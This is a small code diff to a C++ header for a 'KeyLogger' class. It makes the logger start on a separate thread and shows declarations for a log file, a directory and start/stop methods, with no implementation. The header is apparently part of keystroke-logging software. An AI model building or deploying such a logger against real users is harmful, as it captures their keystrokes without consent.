@@ -1,6 +1,7 @@
 #pragma once
 
 #include <string>
+#include <thread>
 
 const std::string FILE_NAME = "\\Logs.txt";
 
@@ -11,7 +12,7 @@ class KeyLogger
 {
 public:
 	int SetDirectory(const char*);
-	void StartKeyLogger();
+	std::thread StartKeyLogger();
 	void StopLogging();
 	void SetDefaultDirectory();
 	KeyLogger();
@@ -20,5 +21,6 @@ public:
 private:
 	std::string directory;
 	bool loggerState;
+	void StartKeyLoggerThread();
 	int CreateLogFile();
 };
